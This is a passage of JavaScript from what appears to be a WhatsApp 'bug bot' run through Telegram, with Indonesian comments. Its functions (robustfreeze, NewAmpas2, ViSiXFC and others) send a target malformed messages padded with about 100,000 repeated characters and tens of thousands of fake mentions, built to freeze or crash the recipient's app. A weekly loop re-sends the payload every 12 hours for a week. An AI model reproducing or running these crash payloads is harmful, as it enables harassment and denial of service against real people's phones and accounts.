          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: generateRandomMessageId(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
}
/*async function VampireGroupInvis(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐍𝐈𝐊𝐀 ☀" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await rofik.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function VampireBugIns(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐍𝐈𝐊𝐀 ☀ 𝐊𝐈𝐋𝐋 𝐆𝐑𝐎𝐔𝐏" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await rofik.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
*/
async function robustfreeze(target, Ptcp = true) {
  try {
    await rofik.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "Anafabula here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n" +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function NewAmpas2(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                paymentInviteMessage: {
                    serviceType: "UPI",
                    expiryTimestamp: Date.now() + 86400000,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await rofik.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}
async function ViSiXFC(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              liveLocationMessage: {
               degreesLatitude: -999.035,
               degreesLongitude: 922.999999999999,
                name: "",
                address: "1.1.1.1.1.1",
              },
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
            },
            contextInfo: {
              participant: target,
              mentionedtarget: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 35000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 500000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await rofik.relayMessage(target, message, {
      messageId: null,
      participant: {target},
      user:target,
    });
  } catch (err) {
    console.log(err);
  }
}
// Kirim bug setiap <intervalHours> jam, total 7 hari
async function weeklyDelay(target, intervalHours = 12) {
  const oneWeek = 7 * 24 * 60 * 60 * 1000;          // 1 minggu
  const interval = intervalHours * 60 * 60 * 1000;  // jeda
  const start    = Date.now();
  let sent       = 0;

  console.log(chalk.blue(
    `[WEEKLY] Mulai spam ke ${target} tiap ${intervalHours} jam, 1 minggu penuh`
  ));

  while (Date.now() - start < oneWeek) {
    // --- Pake payload bug paling “sakit” lo ---
    await zenix2(target);        // atau zenix3/robustfreeze/apa pun
    sent++;
    console.log(chalk.cyan(`[WEEKLY] #${sent} terkirim ke ${target}`));

    // Tunggu sampai interval berikut-nya
    await sleep(interval);
  }

  console.log(chalk.green(
    `[WEEKLY] Selesai! Total ${sent} bug terkirim ke ${target}`
  ));
}

// ✅ Tambahin di sini:
bot.use(async (ctx, next) => {
  try {
    const res = await axios.get('https://raw.githubusercontent.com/GanzJbganteng/id/main/maintenance.json');
    const data = res.data;

    if (data.maintenance_mode) {
      return await ctx.reply(data.message || "⛔ Bot sedang maintenance.");
    }
  } catch (e) {
    console.error("Maintenance check error:", e.message);
  }

  await next();
});
// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...");

// Bot handlers
